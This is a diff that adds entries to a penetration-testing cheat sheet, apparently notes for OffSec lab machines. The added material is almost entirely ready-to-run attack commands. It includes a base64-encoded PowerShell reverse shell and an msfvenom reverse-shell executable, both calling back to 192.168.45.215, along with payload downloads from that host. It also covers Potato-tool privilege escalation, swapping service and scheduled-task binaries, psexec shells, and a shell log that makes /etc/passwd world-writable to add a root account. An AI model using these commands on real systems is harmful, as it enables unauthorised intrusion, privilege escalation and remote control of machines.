@@ -590,6 +590,9 @@ smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
 atexec.py test.local/john:password123@10.10.10.1 <command>
 atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
 
+#if we have access to smb client via username and password we can always try to upgrade to rev shell using impack-psexec
+impacket-psexec domainNAME/USER:'PASSWORD'@<IP>
+
 ```
 
 ## Evil-Winrm
@@ -760,6 +763,10 @@ exiftool -a -u brochure.pdf
 ```powershell
 #Login
 ssh uname@IP #enter the password in the prompt
+
+#if id_rsa or id_ecdsa file is obtained go to notes RELIA WEB01 for walkthrough
+
+#if internal port is discovered when in SSH check RELIA DEMO notes to see how to access via SSH port forward.
 
 #id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
@@ -1274,7 +1281,9 @@ PrivescCheck.ps1
 
 ```powershell
 #Printspoofer
-PrintSpoofer.exe -i -c powershell.exe 
+iwr -uri http://192.168.45.215:8000/PrintSpoofer64.exe -outfile printspoofer.exe
+.\printspoofer.exe -i -c cmd #try both cmd and powershell.exe if one fails
+PrintSpoofer.exe -i -c powershell.exe #try both cmd and powershell.exe if one fails
 PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
 
 #RoguePotato
@@ -1283,6 +1292,8 @@ RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
 #GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
 GodPotato.exe -cmd "shell.exe"
+#god potato powershell base64 encoded port 8888
+.\godpotato.exe -cmd "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 
 #SweetPotato (msfvenom)
 iwr -uri http://192.168.45.215:8000/SweetPotato.exe -outfile sweetpotato.exe #upload sweet potato
@@ -1316,6 +1327,13 @@ icalcs "path" #F means full permission, we need to check we have full access on 
 sc qc <servicename> #find binary path variable
 sc config <service> <option>="<value>" #change the path to the reverse shell location
 sc start <servicename>
+
+#instead of adding user dave2 we can also over write a binary to add a rev shell (auditTracker.exe in this example)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=443 -f exe -o auditTracker.exe
+kali$ nc -lnvp 443 #start netcat on kali try to use ports that are open on the machine instead of 4444
+iwr -uri http://192.168.45.215:8000/auditTracker.exe -outfile auditTracker.exe #go to folder with executable and write our shell
+sc.exe start auditTracker #start binary
+
 ```
 
 ### Unquoted Service Path
@@ -1399,6 +1417,16 @@ schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any intere
 #Permission check - Writable means exploitable!
 icalcs "path"
 #Wait till the scheduled task in executed, then we'll get a shell
+
+#example of overwriting a scheduled task (we can also do this with a rev shell from MSFvenom)
+iwr -uri http://192.168.45.215:8000/adduser.exe -outfile backup.exe #download the file to victim machine
+C:\TEMP\backup.exe backup.exe.bak #move the old executable
+move .\backup.exe C:\TEMP\ #move our shell to the location of the executable
+net user #wait and check if the user was added!!!
+Runas /user:dave2 cmd #run RunAs to switch users
+powershell -Command "Start-Process cmd -Verb Runas" #once logged in get a powershell instance
+
+
 ```
 
 ## Startup Apps
@@ -1517,6 +1545,11 @@ reg query HKCU /f password /t REG_SZ /s
 cmdkey /list #Displays stored credentials looks for any optential users
 #Transfer the reverseshell
 runas /savecred /user:admin C:\Temp\reverse.exe
+
+#once we have added a user we can run the following commands to switch users!
+Runas /user:dave2 cmd #run RunAs to switch users
+powershell -Command "Start-Process cmd -Verb Runas" #once logged in get a powershell instance
+
 ```
 
 ### Pass the Hash
@@ -1546,11 +1579,13 @@ perl -e 'exec "/bin/sh";'
 ## Basic
 
 ```bash
+sudo -l #see what commands we can run as sudo 
 find / -writable -type d 2>/dev/null
 dpkg -l #Installed applications on Debian system
 cat /etc/fstab #Listing mounted drives
 lsblk #Listing all available drives
 lsmod #Listing loaded drivers
+history #always look through any history files we can find!
 
 watch -n 1 "ps -aux | grep pass" #Checking processes for credentials
 sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump
@@ -1610,6 +1645,25 @@ showmount -e <target IP> #On attacker
 mount -o rw <targetIP>:<share-location> <directory path we created>
 #Now create a binary there
 chmod +x <binary>
+```
+
+## ADD user to /etc/passwd
+
+```bash
+offsec@WEB01:~$ openssl passwd w00t
+ip2YLbc0iM7AI
+offsec@WEB01:~$ echo "root2:ip2YLbc0iM7AI:0:0:root:/root:/bin/bash" >> /etc/passwd
+-bash: /etc/passwd: Permission denied
+offsec@WEB01:~$ sudo echo "root2:ip2YLbc0iM7AI:0:0:root:/root:/bin/bash" >> /etc/passwd
+-bash: /etc/passwd: Permission denied
+offsec@WEB01:~$ sudo chmod 777 /etc/passwd
+offsec@WEB01:~$ ls -la /etc/passwd
+-rwxrwxrwx 1 root root 1394 Sep 28  2022 /etc/passwd
+offsec@WEB01:~$ sudo echo "root2:ip2YLbc0iM7AI:0:0:root:/root:/bin/bash" >> /etc/passwd
+offsec@WEB01:~$ su root2
+Password: 
+root@WEB01:/home/offsec# whoami
+root
 ```
 
 ---
@@ -1780,6 +1834,10 @@ Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLL
 
 # parse a local file
 Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
+
+#if we have access to smb client via username and password we can always try to upgrade to rev shell using impack-psexec
+impacket-psexec domainNAME/USER:'PASSWORD'@<IP>
+
 ```
 
 - SMB share - If SYSVOL share or any share which `domain` name as folder name
